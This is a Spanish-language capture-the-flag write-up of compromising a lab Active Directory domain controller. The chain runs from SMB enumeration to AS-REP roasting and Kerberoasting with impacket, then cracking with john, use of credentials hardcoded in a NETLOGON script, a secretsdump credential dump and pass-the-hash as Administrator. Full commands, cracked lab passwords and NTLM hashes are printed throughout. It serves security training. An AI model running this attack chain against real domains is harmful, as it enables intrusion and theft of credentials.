Roasted

- Realizamos un escaneo de puertos inicial, para saber a que nos estamos enfrentando.

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.66.230
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-21 13:52 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 13:52
Scanning 10.10.66.230 [65535 ports]
Discovered open port 139/tcp on 10.10.66.230
Discovered open port 3268/tcp on 10.10.66.230
Discovered open port 53/tcp on 10.10.66.230
Discovered open port 445/tcp on 10.10.66.230
Discovered open port 135/tcp on 10.10.66.230
Discovered open port 88/tcp on 10.10.66.230
Discovered open port 49668/tcp on 10.10.66.230
Increasing send delay for 10.10.66.230 from 0 to 5 due to 11 out of 15 dropped probes since last increase.
Increasing send delay for 10.10.66.230 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.66.230 from 10 to 20 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.66.230 from 20 to 40 due to 11 out of 11 dropped probes since last increase.
Completed SYN Stealth Scan at 13:53, 53.62s elapsed (65535 total ports)
Initiating Service scan at 13:53
Scanning 7 services on 10.10.66.230
Completed Service scan at 13:53, 5.01s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.66.230.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 1.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 0.00s elapsed
Nmap scan report for 10.10.66.230
Host is up, received user-set (0.30s latency).
Scanned at 2024-01-21 13:52:22 EST for 59s
Not shown: 65528 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    REASON          VERSION
53/tcp    open  tcpwrapped syn-ack ttl 125
88/tcp    open  tcpwrapped syn-ack ttl 125
135/tcp   open  tcpwrapped syn-ack ttl 125
139/tcp   open  tcpwrapped syn-ack ttl 125
445/tcp   open  tcpwrapped syn-ack ttl 125
3268/tcp  open  tcpwrapped syn-ack ttl 125
49668/tcp open  tcpwrapped syn-ack ttl 125
~~~

- Podemos ver de primeras varios servicios, pero dos que resaltan bastante en este tipo de máquinas Windows:
	- `Kerberos:`  88
	 - `SMB:` 139/445

- Primero enumeraremos SMB, a ver si de casualidad encontramos algún indicio de que usuarios pueden existir en el `AD`, para esto nos valdremos de `enum4linux`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ enum4linux -U 10.10.66.230
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 21 13:08:44 2024

 =============( Target Information )=============

Target ........... 10.10.66.230
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

===========( Enumerating Workgroup/Domain on 10.10.66.230 )===========

[E] Cant find workgroup/domain

 =============( Session Check on 10.10.66.230 )=============

[+] Server 10.10.66.230 allows sessions using username '', password ''                                              
 =============( Getting domain SID for 10.10.66.230 )=============

Domain Name: VULNNET-RST                                                                                            
Domain Sid: S-1-5-21-1589833671-435344116-4136949213

[+] Host is part of a domain (not a workgroup)                                                                      
 =============( Users on 10.10.66.230 )=============

[E] Couldnt find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                               
[E] Couldnt find users using enumdomusers: NT_STATUS_ACCESS_DENIED 
~~~

- Y bueno, no es mucho pero por lo menos ahora sabemos el nombre del dominio del AD, `VULNNET-RST`, probablemente con un TLD `.local`.
- Veo que de primeras podemos listar los recursos de SMB, y hay algunos con nombres bastante interesantes:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ smbclient -L //10.10.66.230 -N                                     

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    SYSVOL          Disk      Logon server share 
    VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
    VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
~~~

- Utilizamos `crackmapexec` para enumerar usuarios existentes, añadí algunas regex para que el output me mostrara solo los usernames en caso de que existiesen:

~~~bash
┌──(kali💀Dedsec)-[~]
└─$ crackmapexec smb 10.10.66.230 -u 'guest' -p '' --rid-brute | grep -i user | awk -F": " '{print $2}' | awk -F'\' '{print $2}' | awk '{print $1}'
Administrator
Guest
krbtgt
Domain
Protected
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
~~~

- Antes de enumerar a todos los usuarios dentro de kerberos, decidí ver si los otros recursos podían darme más información acerca de como se conformaba el AD.
- Del recurso `VulnNet-Enterprise-Anonymous` obtuve algunas notas de texto, que bajé con get:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ smbclient //10.10.66.230/VulnNet-Enterprise-Anonymous -N
Try "help" to get a list of possible commands.
smb: \> dir
  .         D        0  Fri Mar 12 21:46:40 2021
  ..        D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt        A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt        A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt        A      496  Thu Mar 11 20:24:34 2021

8771839 blocks of size 4096. 4551008 blocks available

~~~

- Al igual que del recurso `VulnNet-Business-Anonymous`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ smbclient //10.10.66.230/VulnNet-Business-Anonymous -N  
Try "help" to get a list of possible commands.
smb: \> dir
  .         D        0  Fri Mar 12 21:46:40 2021
  ..        D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt        A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt        A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt        A      471  Thu Mar 11 20:24:34 2021

8771839 blocks of size 4096. 4551001 blocks available
~~~

<h5>ASREPRoasting:</h5>
- Después de leer las notas podemos identificar algunos roles de usuarios:
	- `Tony Skid (t-skid):` Security Manager
	- `Jhonny Leet (j-leet):` Infraestructure Administrator  
	- `Jack Goldenhand: (j-goldenhand)` Business Team
	- `Alexa Whitehat (A-whitehat):` Business Manager

- Y para optimizar nuestro radio de búsqueda, solo enumeré a estos cuatro  a través de `ASREPRoasting`, para ver si alguno tenía un permiso para recibir un hash de autenticación sin presentar credenciales.
- Para esto, emplearemos `impacket` con su módulo `GetNPUsers`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ impacket-GetNPUsers -usersfile kerbusers.txt -dc-ip 10.10.66.230 vulnnet-rst.local/
Impacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2023 Fortra
$krb5asrep$23$t-skid@vulnnet-rst.local@VULNNET-RST.LOCAL:149c5d10d4f0923129af7dbc86a35e78$898dfaccaf8dd9759603041be3bbd1678665484ddd12348b4c7d8269dc5ad3ae58b5961c677b0365fea5c750b52fed16f0928541ea5a6825727df054389670e2b4b879a0e28e0a505f49bbb3d1f1e6a7b69f06a97971b51eacbdf8a5f2d655d01ed3f57a844058201ea05bd88898e89fc5bc0e6853816c7231b6a34cc500878068a3feb030ea436488114f9ccc8eb989d91da4a13c785b5f95b989d91d40da81f2757d5152665febe7703159cbb899bdde8557cda0442f932371c134d87a80d8d7a983b413328da613ee4b2d0c093670a1d8fe6ac35c2f58fdc076e9f3eda598c6fd79dc259e9f3d1b87eb3b7b7d5ac7b8c67be7d4f1
[-] User j-leet@vulnnet-rst.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand@vulnnet-rst.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat@vulnnet-rst.local doesn't have UF_DONT_REQUIRE_PREAUTH set
~~~

- Genial, vemos que `t-skid` tiene este permiso y nos ha entregado un hash, por lo que ahora solo tendríamos que crackear este para obtener una contraseña:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_kerb.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@vulnnet-rst.local@VULNNET-RST.LOCAL)     
1g 0:00:00:03 DONE (2024-01-21 14:00) 0.2617g/s 832067p/s 832067c/s 832067C/s tj393939..tj021673
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

<h5>Kerberoasting:</h5>
- Con estas credenciales, nos autenticaremos en el dominio para hacer una consulta y buscar algún SPN vinculado a alguna cuenta dentro del AD, para así solicitar a Kerberos un TGS.
- Para esto, emplearemos ``GetUserSPNs``, aprovechándonos que podemos loguearnos en el dominio con `t-skid`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -dc-ip 10.10.160.108 -request
Impacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2023 Fortra

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$b0f92ae2451b3ba0a88c3fbddbd51c4e$1f3a17dd1cf8fac6ea2a73bf542098cb47217abceb7ce97dd73d6fed5aa731ddf4e93fdde75ec8e49bfd977228c2e6312d1713e155fa5a20b33d543f1ab480b9ecd40e184595f2d6357b38db106e71646ad29ea45043d7e977276a0b4384bae871e4741155a78fff79de3d785575124ff40414b68065fd6e14b4f70f805790886739c14a4db54a64f0056ba259c6378a96520009b63a1563b066b9997ec9aa84efc71294468e0bf8433387f35725724f64c2634267f8d1ded12458e1d0fe5f5c741b47cf805d5e3cbf5534156ea8fe83066d53636c56848f800a7f588b7eea85dff825b1110cded4962e61f92da66448a816220518aa61bee98da6e2bd7fd7986cdeda56763b05a2f84a250d43e7f35478c38b27c6704c2c1246805aaa722e0bf3f16238822a41089c459349f393d32cee612bb97ebcb397262351df9a337dd7c4071143911999ca2b9f6463431e5b4999acf74a9c0e5ab2f69e28bac4af7ba6a39157dd3998d0891082bf3a2487f1439a53483bbed5b4b15d1b76b4fc160c39b7044fd1e64533dab73d207e0440f9ea9893ed1fe6f32dfc262fef80faa1b48a1f815e657990ebeca2a350650986d4631bd473df92bd83d15e594e38add3f31ee3e223961ef1a862468760af3bf90f9b40f0571b0adcc5bc8c04bc7a5a11e018ef2e8a32fc16462363368fafd27cdd5d4847d90e25c1495d6474d2dadb90375e2fd98394187e76d9c20df367c74a23228b2b22074f75a53a8ef604af57617be1f88b27d56c7803ccf46cdf7a3da977cb096d97764e43c94c9d409e367933a83e3f18738f3ec99c41abf2fa5259667fbb6c97208c8a173ea8804fc2545ba72a7e13e1ddd625b35e5a1927110300fa6c5ed8be8b132ff0b3b36180a37383b85674be455c20acf5250c4b6a7d9b2a5f83ae7b8b03408e9182ba0fcde9952f16fb3493628e0ed459d349ec4b6bea23e4cbc348645b0e1a6536fa09953a73cd3a8772405d229e522903ea782b0c04570e2e9a74bc23e797ccfb78c80555334a2df6ebc4e4a39c3db13c97479d688c72edbbc45713d4f4bf050462ec7b96aef1fa692c6f7c88bb7012f0e12548e4336cdfe0336d13acf585681fa54274e082553bff1f1e291e0eaf111a50fc880aeec91093d31daf8c89483354cbf01d5d720ef693a477aa355b6a5c0db9282b5d17471799ff1beb883ea7a25f7288c37133c7064f16fd72d28433ba482e57190e6c99c762e079e3ac2f9b3a42bce7179d56feec833e2b263f7fba312f76f107ed4a0a660ef94aed40c38ff4ea8b9859e7cfef5c1a5042e8d072be892abe99cc82f2d49d3227cd7b60c1c18dd096c6a819328c76256d9a2638f01b1e6ba70eefc7f37d5b967fa55d6b6cfab7a5a61e444a9be2
~~~

- Y tenemos un hash de autenticación, relacionado a una cuenta `enterprise-core-vn`.
- Lo crackeamos con `john`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:03 DONE (2024-01-21 14:29) 0.3333g/s 1369Kp/s 1369Kc/s 1369KC/s ryan2love..ry=ibfkfv,s6h,
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

- Y ahora podríamos acceder al AD directamente con esta cuenta, ahora que podemos autenticarnos ante kerberos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ evil-winrm -i 10.10.160.108 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -N
Evil-WinRM shell v3.5

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> whoami
vulnnet-rst\enterprise-core-vn
~~~

***
<h4>PrivEsc:</h4>
- Ahora bien, hubieron algunos recursos que no revisamos en SMB, así que podemos echar un vistazo:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Windows/Roasted]
└─$ smbclient //10.10.66.230/NETLOGON -U 'vulnet-rst.local/t-skid%tj072889*'
Try "help" to get a list of possible commands.
smb: \> dir
  .        D        0  Tue Mar 16 19:15:49 2021
  ..       D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs        A     2821  Tue Mar 16 19:18:14 2021

  8771839 blocks of size 4096. 4553446 blocks available
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
~~~

- Dentro de `NETLOGON` hay un recurso con un nombre interesante, analizándolo vemos que es un archivo de configuración `.vbs` con credenciales hardcodeadas:

~~~vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
~~~

- Con esto, podríamos aprovecharnos de estas nuevas credenciales, y si el usuario tiene suficientes privilegios, podría mostrarnos algún hash NTLM que se encuentre en la database del AD, con el que podríamos efectuar un `pass the hash`:

~~~bash
┌──(kali💀Dedsec)-[~]
└─$ impacket-secretsdump -just-dc vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.160.108
Impacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
~~~

- Y bien, tenemos el hash NTLM de ``Administrator``, ahora solo queda acceder con este mismo y habríamos comprometido la máquina:

~~~bash
┌──(kali💀Dedsec)-[~]
└─$ evil-winrm -i 10.10.160.108 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
~~~
